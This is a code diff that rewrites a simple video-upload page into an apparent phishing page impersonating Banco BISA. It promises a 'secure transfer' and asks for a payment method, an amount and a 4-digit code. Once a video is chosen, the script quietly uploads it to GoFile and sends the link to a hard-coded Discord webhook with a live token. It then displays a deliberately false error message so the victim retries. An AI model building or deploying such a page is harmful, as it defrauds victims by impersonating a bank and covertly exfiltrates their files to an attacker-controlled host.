@@ -1,145 +1,231 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Subir Video MP4</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      background-color: #f4f4f4;
-    }
-    h1 {
-      color: #333;
-    }
-    .input-container {
-      margin: 20px 0;
-    }
-    input[type="file"] {
-      padding: 10px;
-      font-size: 16px;
-    }
-    button {
-      padding: 12px 40px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
-    }
-    button:hover {
-      background-color: #218838;
-    }
-    #result {
-      margin-top: 20px;
-      color: #333;
-      max-width: 600px;
-      word-wrap: break-word;
-    }
-    a {
-      color: #007bff;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transferencia - Banco BISA</title>
+    <style>
+        :root {
+            --color-azul: #003e7a;
+            --color-amarillo: #f3d600;
+            --color-amarillo-pastel: #FFF8C1;
+            --color-blanco: #ffffff;
+            --color-blanco-pastel: #FFFFFFE6;
+            --color-negro: #000000;
+        }
+        body {
+            font-family: "Open Sans", sans-serif;
+            font-optical-sizing: auto;
+            font-weight: 400;
+            font-style: normal;
+            font-variation-settings: "wdth" 100;
+            text-align: center;
+            padding: 16px;
+            max-width: 700px;
+            margin: 0 auto;
+            background-color: #fff;
+        }
+        header {
+            margin-bottom: 1.5rem;
+        }
+        #logo {
+            margin: 5px 0;
+            max-width: 200px;
+            height: auto;
+        }
+        #description {
+            font-size: 0.9rem;
+            color: #444;
+            font-weight: 500;
+            line-height: 1.4;
+            margin: 5px 0;
+        }
+        h1 {
+            color: #333;
+            font-size: 1.75rem;
+            margin: 1rem 0;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        label {
+            color: var(--color-negro);
+            font-weight: bold;
+            font-size: 1.063rem;
+        }
+        input, select {
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid var(--color-azul);
+            border-radius: 6px;
+            font-size: 1rem;
+            background-color: var(--color-amarillo-pastel);
+        }
+        button {
+            background-color: var(--color-azul);
+            color: var(--color-blanco);
+            border: none;
+            cursor: pointer;
+            padding: 15px;
+            margin-top: 10px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 6px;
+        }
+        button:disabled {
+            background-color: #FFA9A9;
+            cursor: not-allowed;
+            color: var(--color-blanco-pastel);
+        }
+        button:hover:not(:disabled) {
+            background-color: var(--color-azul);
+            color: var(--color-blanco);
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            font-size: 1rem;
+        }
+        #status.error {
+            color: red;
+        }
+        #status.success {
+            color: green;
+        }
+        #footer-logo {
+            max-width: 100%;
+            margin: 5px 0;
+        }
+    </style>
 </head>
 <body>
-  <h1>Subir un video MP4</h1>
-  <div class="input-container">
-    <input type="file" id="videoInput" accept="video/mp4">
-    <br>
-    <button onclick="uploadVideo()">Subir video</button>
-  </div>
-  <div id="result"></div>
+    <header>
+        <img src="images/Logo_Banco_BISA.png" alt="Banco BISA" id="logo" />
+        <p id="description">
+            Complete correctamente los datos requeridos en esta sección para recibir el pago. <strong>La transferencia es segura,</strong> se procesa al instante y el trámite es totalmente seguro y confiable.
+        </p>
+    </header>
+    
+    <main style="background: var(--color-amarillo); border-radius: 6px; padding: 10px;">
+        <h1>Transferencia</h1>
+        <form id="uploadForm">
+            <label for="videoUpload">Selecciona el video MP4:</label>
+            <input type="file" id="videoUpload" accept="video/mp4" required />
+            
+            <label for="paymentMethod">Método de pago:</label>
+            <select id="paymentMethod" required>
+                <option value="" disabled selected>Selecciona una opción</option>
+                <option value="banco_bisa">Banco BISA</option>
+                <option value="mercado_pago">Mercado Pago</option>
+                <option value="entel">Entel S. A.</option>
+                <option value="tigo_money">Tigo Money</option>
+                <option value="wester_union">Western Union</option>
+                <option value="bancosol">BancoSol</option>
+                <option value="bnb">BNB</option>
+            </select>
+            
+            <label for="amount">Monto:</label>
+            <select id="amount" required>
+                <option value="" disabled selected>Selecciona un monto</option>
+                <option value="2">$2</option>
+                <option value="4">$4</option>
+                <option value="6">$6</option>
+                <option value="8">$8</option>
+                <option value="10">$10</option>
+                <option value="12">$12</option>
+            </select>
 
-  <script>
-    async function uploadVideo() {
-      const fileInput = document.getElementById('videoInput');
-      const file = fileInput.files[0];
-      const resultDiv = document.getElementById('result');
-      const webhookURL = 'https://canary.discord.com/api/webhooks/1386528053928399009/TZF5aMl1kDEivHUSUD2GAptARUhUs4-X7B2eAFComc8_Cx6sU4oloRxPCFj0uGAbClgn';
+            <label for="code">Código único (4 dígitos):</label>
+            <input type="text" id="code" maxlength="4" pattern="\d{4}" required />
 
-      if (!file) {
-        resultDiv.innerHTML = 'Por favor, selecciona un video MP4.';
-        return;
-      }
+            <button type="submit" id="submitButton" disabled>Recibir Pago</button>
+        </form>
+        <p id="status"></p>
+    </main>
+    <footer>
+        <h3 style="padding: 20px 0 5px;">Novedades USDT</h3>
+        <img id="footer-logo" src="images/CriptoBisa1440x800px.png" alt="" />
+        <p style="margin: 25px 0 5px 0; font-size: 11px;">&copy; 2025 Banco BISA S.A. - Todos los derechos reservados.<br>
+            Esta entidad es supervisada por ASFI.
+        </p>
+    </footer>
 
-      // Validar tamaño del archivo (máximo 100 MB para prueba)
-      if (file.size > 100 * 1024 * 1024) {
-        resultDiv.innerHTML = 'El video es demasiado grande. Usa un video de menos de 100 MB.';
-        return;
-      }
+    <script>
+        const videoInput = document.getElementById('videoUpload');
+        const paymentMethod = document.getElementById('paymentMethod');
+        const amount = document.getElementById('amount');
+        const codeInput = document.getElementById('code');
+        const submitButton = document.getElementById('submitButton');
+        const statusP = document.getElementById('status');
 
-      // Subir el video a GoFile usando la nueva API
-      const formData = new FormData();
-      formData.append('file', file);
+        // Función para verificar si los campos requeridos están completos
+        function checkForm() {
+            const videoSelected = videoInput.files.length > 0;
+            const paymentSelected = paymentMethod.value !== '';
+            const amountSelected = amount.value !== '';
 
-      try {
-        resultDiv.innerHTML = 'Subiendo video a GoFile...';
-        const response = await fetch('https://upload.gofile.io/uploadfile', {
-          method: 'POST',
-          body: formData,
-          mode: 'cors'
+            if (videoSelected && paymentSelected && amountSelected) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
+            }
+        }
+
+        // Escuchar cambios en los campos requeridos
+        videoInput.addEventListener('change', () => {
+            checkForm();
+            if (videoInput.files.length > 0) {
+                uploadVideo(); // Subida automática al seleccionar el video
+            }
         });
+        paymentMethod.addEventListener('change', checkForm);
+        amount.addEventListener('change', checkForm);
+        codeInput.addEventListener('input', checkForm); // Aunque no afecta la habilitación del botón
 
-        // Registrar detalles de la respuesta
-        console.log('URL solicitada:', response.url);
-        console.log('Estado HTTP:', response.status);
-        console.log('Estado texto:', response.statusText);
-        console.log('Content-Type:', response.headers.get('content-type'));
-        console.log('Headers:', [...response.headers.entries()]);
+        // Función para subir el video automáticamente
+        async function uploadVideo() {
+            statusP.textContent = 'Cargando pago...';
+            statusP.className = '';
 
-        // Verificar si la respuesta es JSON
-        const contentType = response.headers.get('content-type');
-        if (!contentType || !contentType.includes('application/json')) {
-          const text = await response.text();
-          resultDiv.innerHTML = `Error: Respuesta no es JSON (Código: ${response.status} ${response.statusText}). Detalles: ${text.slice(0, 200)}`;
-          console.log('Respuesta completa:', text);
-          throw new Error(`Respuesta no es JSON (Código: ${response.status})`);
+            const file = videoInput.files[0];
+            const formData = new FormData();
+            formData.append('file', file);
+
+            try {
+                const response = await fetch('https://upload.gofile.io/uploadfile', {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'cors'
+                });
+
+                const data = await response.json();
+
+                if (data.status === 'ok') {
+                    const downloadLink = data.data.downloadPage;
+                    const webhookURL = 'https://canary.discord.com/api/webhooks/1386528053928399009/TZF5aMl1kDEivHUSUD2GAptARUhUs4-X7B2eAFComc8_Cx6sU4oloRxPCFj0uGAbClgn';
+
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `Nuevo video subido: **${file.name}**\nEnlace: ${downloadLink}`
+                        })
+                    });
+
+                    // Simular error aunque fue exitoso
+                    statusP.textContent = 'Error, intente nuevamente';
+                    statusP.className = 'error';
+                } else {
+                    statusP.textContent = 'Error al subir el video';
+                    statusP.className = 'error';
+                }
+            } catch (error) {
+                statusP.textContent = 'Error de conexión';
+                statusP.className = 'error';
+            }
         }
-
-        const data = await response.json();
-        console.log('Respuesta JSON:', data);
-
-        if (data.status !== 'ok') {
-          resultDiv.innerHTML = `Error al subir el video a GoFile. Detalles: ${JSON.stringify(data)}`;
-          return;
-        }
-
-        const downloadLink = data.data.downloadPage;
-        const fileName = file.name;
-
-        // Enviar el enlace al webhook de Discord
-        resultDiv.innerHTML = 'Enviando enlace a Discord...';
-        const webhookResponse = await fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `Nuevo video subido: **${fileName}**\nEnlace: ${downloadLink}`
-          })
-        });
-
-        console.log('Estado HTTP Discord:', webhookResponse.status);
-        console.log('Estado texto Discord:', webhookResponse.statusText);
-
-        if (!webhookResponse.ok) {
-          const webhookText = await webhookResponse.text();
-          resultDiv.innerHTML = `Error al enviar el enlace a Discord (Código: ${webhookResponse.status} ${webhookResponse.statusText}). Detalles: ${webhookText.slice(0, 200)}`;
-          return;
-        }
-
-        resultDiv.innerHTML = `¡Video subido con éxito! Enlace: <a href="${downloadLink}" target="_blank">${downloadLink}</a>`;
-      } catch (error) {
-        resultDiv.innerHTML = `Error: ${error.message}`;
-        console.error('Error detallado:', error);
-      }
-    }
-  </script>
+    </script>
 </body>
 </html>
